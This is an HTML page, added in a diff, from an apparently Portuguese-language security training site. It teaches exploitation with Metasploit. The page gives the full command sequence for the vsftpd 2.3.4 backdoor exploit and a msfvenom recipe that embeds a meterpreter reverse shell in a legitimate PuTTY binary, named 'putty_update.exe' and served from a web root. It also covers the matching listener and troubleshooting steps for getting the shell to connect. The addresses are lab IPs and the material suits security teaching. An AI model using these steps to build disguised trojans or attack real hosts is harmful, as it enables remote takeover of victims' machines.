@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>09. Exploração de Vulnerabilidades & Metasploit — SecVault</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <a href="../index.html" class="sidebar-title">🛡️ SecVault</a>
+      <span class="sidebar-badge">Knowledge Base</span>
+    </div>
+
+    <div class="nav-group-title">Introdução</div>
+    <ul class="nav-links">
+      <li><a href="../index.html">Visão Geral</a></li>
+    </ul>
+
+    <div class="nav-group-title">Fundamentos & Redes</div>
+    <ul class="nav-links">
+      <li><a href="01-principios-cyberseguranca.html">01. Princípios de Segurança</a></li>
+      <li><a href="02-redes-computadores.html">02. Redes de Computadores</a></li>
+      <li><a href="03-usuarios-linux.html">03. Usuários & Permissões Linux</a></li>
+      <li><a href="04-ssh-linux.html">04. SSH & Acesso Seguro</a></li>
+    </ul>
+
+    <div class="nav-group-title">Reconhecimento & Scanning</div>
+    <ul class="nav-links">
+      <li><a href="05-osint-ciberseguranca.html">05. OSINT & Fontes Abertas</a></li>
+      <li><a href="06-varredura-nmap.html">06. Varredura com Nmap</a></li>
+      <li><a href="07-enumeracao.html">07. Técnicas de Enumeração</a></li>
+    </ul>
+
+    <div class="nav-group-title">Pentest & Exploração</div>
+    <ul class="nav-links">
+      <li><a href="08-fundamentos-pentest.html">08. Fundamentos de Pentest</a></li>
+      <li><a href="09-exploracao-vulnerabilidades.html" class="active">09. Exploração de Vulnerabilidades</a></li>
+      <li><a href="10-brute-force-medusa.html">10. Força Bruta & Medusa</a></li>
+      <li><a href="11-pos-exploracao.html">11. Pós-Exploração & Pivoting</a></li>
+    </ul>
+
+    <div class="nav-group-title">Defesa & Inteligência</div>
+    <ul class="nav-links">
+      <li><a href="12-engenharia-social.html">12. Engenharia Social</a></li>
+      <li><a href="13-deepweb-anonimizacao.html">13. Anonimização & Tor</a></li>
+    </ul>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-wrapper">
+    <div class="content-container">
+      <h1>💣 Exploração de Vulnerabilidades com Metasploit Framework</h1>
+      
+      <blockquote>
+        <strong>Conceito Fundamental:</strong> Na cibersegurança ofensiva, o analista nunca adivinha comandos aleatórios. A exploração é o resultado de uma linha investigativa contínua:
+        <code>Varredura (Nmap -sV) ➔ Identificação do Software e Versão Exata ➔ Pesquisa de Falhas (Search) ➔ Configuração no Metasploit ➔ Execução do Exploit</code>.
+      </blockquote>
+
+      <h2>1. O Fluxo de Trabalho: Da Varredura até o Exploit</h2>
+      <pre><code>[1. NMAP -sV] ────────► [2. PESQUISA] ────────► [3. METASPLOIT] ────────► [4. EXPLOIT]
+Lê a porta, o software   Busca se a versão      Carrega o módulo         Entrega o payload e
+e a versão exata         tem CVE/falha          e ajusta RHOSTS/LHOST    ganha acesso (Shell)</code></pre>
+
+      <h2>2. O Ciclo Padrão de Comandos no msfconsole</h2>
+      <pre><code># 1. Carregar o módulo escolhido
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+# 2. Inspecionar parâmetros obrigatórios
+show options
+
+# 3. Definir o IP do Alvo (RHOSTS = Remote Host)
+set RHOSTS 192.168.56.102
+
+# 4. Definir o IP da sua máquina atacante (LHOST = Local Host)
+set LHOST 192.168.56.101
+
+# 5. Disparar a exploração
+exploit</code></pre>
+
+      <h2>3. Laboratórios Práticos Demonstrados</h2>
+
+      <h3>Caso 1: Exploração do vsftpd 2.3.4 (Backdoor Histórica)</h3>
+      <p>O software continha uma backdoor intencional: ao tentar autenticar com um username terminando em <code>:)</code>, o daemon abria a porta <code>6200/TCP</code> com shell root direto.</p>
+      <pre><code>use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+exploit
+# Pós-acesso: id ➔ uid=0(root)</code></pre>
+
+      <h3>Caso 2: Geração de Trojan com Msfvenom e Handler</h3>
+      <p>Injeção de uma Reverse Shell em um executável legítimo (PuTTY) preservando sua funcionalidade original com o parâmetro <code>-k</code>:</p>
+      <pre><code># Geração do binário:
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.56.101 \
+  LPORT=4444 \
+  -x /root/Downloads/putty.exe \
+  -k \
+  -f exe \
+  -o /var/www/html/putty_update.exe
+
+# Listener no Metasploit:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.56.101
+set LPORT 4444
+exploit</code></pre>
+
+      <h2>4. Guia Rápido de Solução de Problemas em Laboratório</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Problema Comum</th>
+            <th>Causa Real</th>
+            <th>Como Resolver</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>Exploit failed: Connection refused</code></td>
+            <td>A versão do serviço no alvo não é exatamente a vulnerável.</td>
+            <td>Confirme no Nmap se a versão do daemon é idêntica ao exploit.</td>
+          </tr>
+          <tr>
+            <td>O executável roda mas a shell não abre</td>
+            <td><code>LHOST</code> configurado com IP errado (ex: loopback ou IP do alvo).</td>
+            <td>Defina <code>LHOST</code> exatamente com o IP da interface do seu Kali Linux.</td>
+          </tr>
+          <tr>
+            <td><code>Handler failed to bind</code></td>
+            <td>A porta de escuta (ex: 4444) já está em uso por outro processo.</td>
+            <td>Troque para outra porta (ex: 5555) em ambos os comandos.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <footer>
+      <p>&copy; 2026 Cybersecurity Knowledge Vault — Mantido por <strong>M0RCEGG0</strong>.</p>
+    </footer>
+  </main>
+
+</body>
+</html>
